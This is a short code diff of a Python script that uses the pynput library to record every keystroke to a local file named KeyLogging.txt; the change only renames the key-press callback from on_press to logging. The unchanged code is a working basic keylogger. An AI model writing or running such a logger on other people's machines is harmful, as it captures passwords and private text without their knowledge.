@@ -5,7 +5,7 @@
 from pynput.keyboard import Key, Listener
 
 
-def on_press(key):
+def logging(key):
     try: #This will log your normal alphanuemeric keys
         with open("KeyLogging.txt", "a") as file:
             file.write(f"{key.char}")
@@ -15,5 +15,5 @@ def on_press(key):
         with open("KeyLogging.txt", "a") as file:
             file.write(f" [{key}] ")
 
-with Listener(on_press=on_press) as listener:
+with Listener(on_press=logging) as listener:
     listener.join() #This keeps the program running and captures keystrokes continuously
